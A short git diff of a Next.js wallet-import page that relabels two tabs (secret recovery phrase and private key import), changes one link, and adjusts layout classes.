@@ -7,17 +7,17 @@ import Image from "next/image";
 export default function Import() {
   const tabs = [
     {
-      name: "Enter recovery phrase or private key",
+      name: "Enter secret recovery phrase",
       link: "/input",
       description:
-        "Securely import your wallet using your 12-word recovery phrase or private key",
+        "Securely import your existing wallet using 12 or 24-word recovery phrase",
       image: "/Img2.svg",
     },
     {
-      name: "Connect Ledger wallet",
-      link: "/input",
+      name: "Import Private Key",
+      link: "/input-passkey",
       description:
-        "Approve transactions using a Ledger device (Ethereum only). A new tab will open",
+        "Import a single-chain account (Support: Etheruem, Solana, Bitcoin, and others)",
       image: "/Img1.svg",
     },
   ];
@@ -43,8 +43,8 @@ export default function Import() {
               href={tab.link}
               key={index}
               className="block p-5 outline outline-1 outline-gray-500 rounded-lg">
-              <div className="flex justify-center justify-items-center">
-                <div className="flex-1 w-90">
+              <div className="flex justify-center justify-items-center gap-2">
+                <div className="flex-1 w-11/12">
                   <h2 className=" text-lg font-semibold">{tab.name}</h2>
                   <p className="text-gray-400 mt-2">{tab.description}</p>
                 </div>
